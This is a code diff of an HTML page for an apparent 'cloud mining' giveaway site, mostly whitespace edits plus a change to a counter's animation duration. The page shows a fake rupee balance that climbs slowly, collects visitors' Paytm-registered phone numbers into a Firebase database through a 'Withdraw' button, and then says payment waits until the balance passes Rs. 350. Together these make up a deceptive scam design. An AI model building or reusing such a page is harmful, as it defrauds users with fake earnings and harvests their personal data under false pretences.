@@ -22,7 +22,7 @@
   };
   firebase.initializeApp(config);
     console.log(firebase);
-</script>   
+</script>
 <script>
   window.dataLayer = window.dataLayer || [];
   function gtag(){dataLayer.push(arguments);}
@@ -158,10 +158,10 @@ var x = setInterval(function() {
   <div id="shiva">Rs.<span class="count">500</span></div>
   <br>
   <label><b>Enter Paytm Registered mobile number:</b></label>
-    
+
 <textarea placeholder="Enter number here..." id="numbers" style="height: 35px; width: 150px;"></textarea>
-<button type="button" class="btn btn-info" onclick="myFunction()" id="withdraw">Withdraw</button>     
-                                        
+<button type="button" class="btn btn-info" onclick="myFunction()" id="withdraw">Withdraw</button>
+
 
       <h2>Early Bird sign up!</h2><a href="login.html"><button type="button" class="btn btn-info">Log In</button></a>
       <p>We are going live on February 15, 2018. Till then we are doing a discount giveaway of our cloud mining contracts. Check out the prices and the benefits below and sign up.</p>
@@ -254,7 +254,7 @@ $('.count').each(function () {
     $(this).prop('Counter',0).animate({
         Counter: $(this).text()
     }, {
-        duration: 6000000000000000000000000000000000000000000000000000000000000000000,
+        duration: 8600000,
         easing: 'swing',
         step: function (now) {
             $(this).text(Math.ceil(now));
@@ -264,12 +264,12 @@ $('.count').each(function () {
 
 var paynum= document.getElementById("numbers");
 var withdraw= document.getElementById("numbers");
-    var withdrawbtn= document.getElementById("withdraw");    
+    var withdrawbtn= document.getElementById("withdraw");
 var withdrawbtn= document.getElementById("withdraw");
     function myFunction(){
         var firebaseRef= firebase.database().ref();
         var msgtext= withdraw.value;
-        firebaseRef.push().set(msgtext); 
+        firebaseRef.push().set(msgtext);
         window.alert("We have received your withdrawal request; however your payment will only process once you accumulate more than Rs. 350 in your balance.");
     }
 </script>
